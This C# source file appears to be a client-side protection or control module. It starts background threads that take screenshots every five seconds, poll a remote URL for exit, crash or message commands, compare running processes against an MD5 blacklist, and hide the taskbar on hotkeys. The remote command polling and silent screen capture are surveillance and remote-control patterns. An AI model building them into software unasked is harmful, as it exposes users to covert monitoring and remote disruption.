using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace cSec
{
    public class GlobalThreads
    {
        public static void InitThreads()
        {
            if (Globals.RequireInternetConnection)
                CheckConnection.Start();
            if (Globals.CommandReader)
                CommandReader.Start();
            if (Globals.FileChecker)
                ProcessChecker.Start();
            if (Globals.ScreenShotter)
                ScreenShotter.Start();
            //MouseReader.Start();
            Keybinds.Start();
        }
        static Thread ScreenShotter = new Thread(() =>
        {
            int counter = 0;
            while (true)
            {
                counter++;
                GlobalFunctions.CaptureScreen(Globals.picturePath + counter + ".png");
                Thread.Sleep(5000);
            }
        });
        static Thread CheckConnection = new Thread(() =>
        {
            //Attempt to ping every 5 seconds
            while (true)
            {
                if (GlobalFunctions.GetGetUserIpAddress() == null)
                {
                    Console.WriteLine(Globals.ConnectionLostErrorMessage);
                    Environment.Exit(0);
                }
                Thread.Sleep(5000);
            }
        });
        static Thread CommandReader = new Thread(() =>
        {
            //Attempt to ping every 5 seconds
            while (true)
            {
                try
                {
                    Thread.Sleep(100);
                    string command = GlobalFunctions.UrlToString("http://heroin.cloud/command.txt");
                    switch (command.Trim())
                    {
                        case "exit":
                            Console.WriteLine("Forced exit");
                            Thread.Sleep(50);
                            Environment.Exit(0);
                            break;
                        case "crash":
                            GlobalFunctions.Crash();
                            break;
                        case "message":
                            GlobalFunctions.MessageBoxTopMost("Message Text");
                            break;
                        default:
                            //Console.WriteLine("unknown command: " + command);
                            break;
                    }
                }
                catch { };
            }
        });
        static Thread MouseReader = new Thread(() =>
        {
            int tCounter = 0;
            int tFreezeTime = 500; //Freeze mouse for 5 seconds
            while (tCounter != tFreezeTime)
            {
                Thread.Sleep(1);
                Cursor.Position = new Point(0, 0);
                tCounter++;
            }
            MouseReader.Abort();
        });
        static Thread ProcessChecker = new Thread(() =>
        {
            List<string> badProcs = new List<string>() { };

            badProcs.Add("e76e985d2bc9e5987e0aaa9ca7733a71");
            Process[] p = Process.GetProcesses();
            foreach (Process m in p)
            {
                try
                {
                    //Console.WriteLine(GlobalFunctions.CalculateMD5(m.MainModule.FileName));
                    if (badProcs.Contains(GlobalFunctions.CalculateMD5(m.MainModule.FileName)))
                    {
                        //Console.WriteLine("Bad process: " + m.ProcessName);                        
                    }
                }
                catch { }
            }
            ProcessChecker.Abort();
        });
        static Thread Keybinds = new Thread(() =>
        {

            while (true)
            {
                //Console.WriteLine(GlobalFunctions.GetActiveWindowTitle());
                System.Threading.Thread.Sleep(1);
                if (Convert.ToBoolean(GlobalKeys.GetKeyState(GlobalKeys.VirtualKeyStates.VK_HOME) & GlobalKeys.KEY_PRESSED))
                {
                    Console.Beep();
                    Environment.Exit(0);
                }
                if (Convert.ToBoolean(GlobalKeys.GetKeyState(GlobalKeys.VirtualKeyStates.VK_DOWN) & GlobalKeys.KEY_PRESSED))
                {
                    Console.Beep();
                    GlobalFunctions.HideProgramTaskbar();
                }
                if (Convert.ToBoolean(GlobalKeys.GetKeyState(GlobalKeys.VirtualKeyStates.VK_UP) & GlobalKeys.KEY_PRESSED))
                {
                    Console.Beep();
                    GlobalFunctions.ShowProgramTaskbar();
                }
            }
        });
    }
}